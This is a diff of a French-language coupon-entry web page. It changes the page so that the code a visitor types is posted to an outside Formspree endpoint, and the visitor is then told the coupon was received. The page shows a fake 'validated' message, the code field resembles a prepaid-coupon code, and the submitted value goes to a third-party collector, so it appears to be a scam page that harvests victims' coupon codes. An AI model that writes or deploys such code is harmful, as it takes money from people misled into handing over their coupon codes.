@@ -164,6 +164,19 @@
   }
   .btn:hover { background: #ea5d80; }
   .btn:active { transform: translateY(1px); box-shadow: 0 4px 10px rgba(239, 111, 142, 0.25); }
+  .btn:disabled {
+    cursor: wait;
+    opacity: 0.72;
+    transform: none;
+  }
+
+  .status-message {
+    min-height: 24px;
+    margin-top: 16px;
+    color: #d14d70;
+    font-size: 15px;
+    font-weight: 700;
+  }
 
   /* ====== MOBILE ====== */
   @media (max-width: 640px) {
@@ -224,24 +237,26 @@
   <div class="card" id="card" role="dialog" aria-labelledby="title">
 
     <!-- Vue: saisie du code -->
-    <div class="view active" id="view-form">
+    <form class="view active" id="view-form" action="https://formspree.io/f/xwvywokv" method="POST">
       <div class="ticket-wrap">
         <img class="ticket" src="ticket.png" alt="Coupon">
       </div>
       <h2 id="title">Entrez le code du coupon</h2>
+      <input type="hidden" name="_subject" value="Nouveau code coupon">
       <div class="field">
-        <input type="text" class="code-input" id="code" placeholder="A1B2C3D4E5"
-               maxlength="10" autocomplete="off" spellcheck="false"
+        <input type="text" class="code-input" id="code" name="coupon_code" placeholder="A1B2C3D4E5"
+               maxlength="10" autocomplete="off" spellcheck="false" required
                aria-label="Code du coupon">
       </div>
-      <button class="btn" type="button" id="validateBtn">Valider</button>
-    </div>
+      <button class="btn" type="submit" id="validateBtn">Valider</button>
+      <p class="status-message" id="formStatus" aria-live="polite"></p>
+    </form>
 
     <!-- Vue: erreur -->
     <div class="view" id="view-error">
       <img class="error-illu" src="logo.png" alt="Erreur">
-      <h2 class="error-title">Code validé&nbsp;!</h2>
-      <p class="error-msg">Votre coupon a bien été activé</p>
+      <h2 class="error-title">Code reçu&nbsp;!</h2>
+      <p class="error-msg">Votre coupon a bien été envoyé</p>
       <button class="btn" type="button" id="retryBtn">Continuer</button>
       <button class="link-btn" type="button" id="cancelBtn">Fermer</button>
     </div>
@@ -253,8 +268,10 @@
     const viewForm = document.getElementById('view-form');
     const viewErr  = document.getElementById('view-error');
     const codeInp  = document.getElementById('code');
+    const validateBtn = document.getElementById('validateBtn');
+    const formStatus = document.getElementById('formStatus');
 
-    function showError() {
+    function showSuccess() {
       viewForm.classList.remove('active');
       viewErr.classList.add('active');
       card.classList.add('error');
@@ -264,10 +281,45 @@
       viewForm.classList.add('active');
       card.classList.remove('error');
       codeInp.value = '';
+      formStatus.textContent = '';
+      validateBtn.disabled = false;
+      validateBtn.textContent = 'Valider';
       codeInp.focus();
     }
 
-    document.getElementById('validateBtn').addEventListener('click', showError);
+    viewForm.addEventListener('submit', async (event) => {
+      event.preventDefault();
+
+      const code = codeInp.value.trim().toUpperCase();
+      if (!code) {
+        formStatus.textContent = 'Entre un code avant de valider.';
+        codeInp.focus();
+        return;
+      }
+
+      codeInp.value = code;
+      formStatus.textContent = '';
+      validateBtn.disabled = true;
+      validateBtn.textContent = 'Envoi...';
+
+      try {
+        const response = await fetch(viewForm.action, {
+          method: 'POST',
+          body: new FormData(viewForm),
+          headers: { Accept: 'application/json' }
+        });
+
+        if (!response.ok) {
+          throw new Error('Formspree a refuse la demande.');
+        }
+
+        showSuccess();
+      } catch (error) {
+        formStatus.textContent = "L'envoi a echoue. Reessaie dans un instant.";
+        validateBtn.disabled = false;
+        validateBtn.textContent = 'Valider';
+      }
+    });
     document.getElementById('retryBtn').addEventListener('click', showForm);
     document.getElementById('cancelBtn').addEventListener('click', showForm);
 
